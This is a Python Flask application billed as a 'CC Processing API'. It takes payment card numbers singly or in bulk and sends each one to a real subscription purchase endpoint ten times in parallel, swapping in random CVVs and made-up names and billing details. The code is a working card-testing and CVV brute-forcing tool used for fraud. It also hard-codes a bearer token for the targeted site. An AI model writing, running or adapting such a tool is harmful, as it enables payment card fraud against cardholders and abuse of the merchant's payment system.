from flask import Flask, request, jsonify
import requests
import random as r
import threading
import time

app = Flask(__name__)

def process_card(card_data, thread_num):
    """
    Process individual card data in separate thread
    """
    try:
        # Parse card data (format: 4937280083174753|11|26|779)
        parts = card_data.split('|')
        if len(parts) != 4:
            return f"Thread {thread_num}: Invalid card format"
        
        card_number = parts[0]
        card_month = parts[1]
        card_year = parts[2]
        original_cvv = parts[3]
        
        # Generate random data
        random_num = r.randint(1000000, 999999999999)
        name = 'jack' + str(random_num)
        name2 = 'jackjones' + str(random_num)
        zip_code = 9998 + random_num
        
        # Generate random CVV for this thread
        random_cvv = str(r.randint(100, 999))
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5,ru;q=0.4',
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL2NyZWF0b3JhcGkucGx1Z3hyLmNvbS9hcGkvYXV0aC9zb2NpYWwvbG9naW4vZ29vZ2xlL2NhbGxiYWNrIiwiaWF0IjoxNzYyMTY3NjA3LCJleHAiOjE3NjIyNTQwMDcsIm5iZiI6MTc2MjE2NzYwNywianRpIjoiaGFBU210WWdlUUg1bXRLRCIsInN1YiI6IjkxNDA3IiwicHJ2IjoiZDkyZmNlYzMyNDIxMzZkZjViY2FjMTY3ZTg3ZDZkYzFlYzUzZDdkNSJ9.phvaQlV0iBsSausvEfeeKlo6Nlx7S7Lx_C007qUpFGs',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.plugxr.com',
            'priority': 'u=1, i',
            'referer': 'https://www.plugxr.com/',
            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        }

        data = {
            'payment_method': 'card',
            'card_number': card_number,
            'card_month': card_month,
            'card_year': card_year,
            'card_cvv': random_cvv,  # Using random CVV
            'card_name': name,
            'billing_period': 'yearly',
            'billing_first_name': name2,
            'billing_pin': zip_code,
            'billing_country': 'India',
            'auto_renewal': '3652',
            'coupon_code': '',
            'from_source': 'live',
            'source_url': 'website',
        }

        response = requests.post(
            'https://creatorapi.plugxr.com/api/Pricing/PurchasePlan', 
            headers=headers, 
            data=data
        )
        
        return f"Thread {thread_num} - Card: {card_number} - CVV: {random_cvv} - Status: {response.status_code} - Response: {response.text}"
    
    except Exception as e:
        return f"Thread {thread_num} - Error: {e}"

@app.route('/process', methods=['GET'])
def process_single_card():
    """
    Process single card with 10 parallel threads
    Example: http://localhost:5000/process?cc=4937280083174753|11|26|779
    """
    card_data = request.args.get('cc')
    
    if not card_data:
        return jsonify({"error": "Card data parameter 'cc' is required"}), 400
    
    results = []
    threads = []
    
    def worker(thread_num):
        result = process_card(card_data, thread_num)
        results.append(result)
    
    # Create and start 10 threads
    for i in range(10):
        thread = threading.Thread(target=worker, args=(i+1,))
        threads.append(thread)
        thread.start()
        time.sleep(0.1)  # Small delay
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    return jsonify({
        "card_data": card_data,
        "threads_count": 10,
        "results": results
    })

@app.route('/bulk_process', methods=['POST'])
def bulk_process_cards():
    """
    Process multiple cards with 10 threads each
    Expects JSON: {"cards": ["card1|11|26|779", "card2|12|27|780"]}
    """
    data = request.get_json()
    
    if not data or 'cards' not in data:
        return jsonify({"error": "JSON with 'cards' array is required"}), 400
    
    all_results = {}
    
    for card_index, card_data in enumerate(data['cards'], 1):
        results = []
        threads = []
        
        def worker(thread_num):
            result = process_card(card_data, thread_num)
            results.append(result)
        
        # Create and start 10 threads for each card
        for i in range(10):
            thread = threading.Thread(target=worker, args=(i+1,))
            threads.append(thread)
            thread.start()
            time.sleep(0.1)
        
        # Wait for all threads to complete for this card
        for thread in threads:
            thread.join()
        
        all_results[f"card_{card_index}"] = {
            "card_data": card_data,
            "results": results
        }
    
    return jsonify({
        "total_cards_processed": len(data['cards']),
        "results": all_results
    })

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({"status": "active", "message": "Flask CC Processor API is running"})

@app.route('/')
def home():
    """Home page with usage instructions"""
    instructions = {
        "message": "CC Processing API",
        "endpoints": {
            "single_card": "GET /process?cc=4937280083174753|11|26|779",
            "bulk_cards": "POST /bulk_process with JSON: {'cards': ['card1|11|26|779', 'card2|12|27|780']}",
            "health_check": "GET /health"
        },
        "note": "Each card will be processed with 10 parallel threads using random CVVs"
    }
    return jsonify(instructions)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000) 
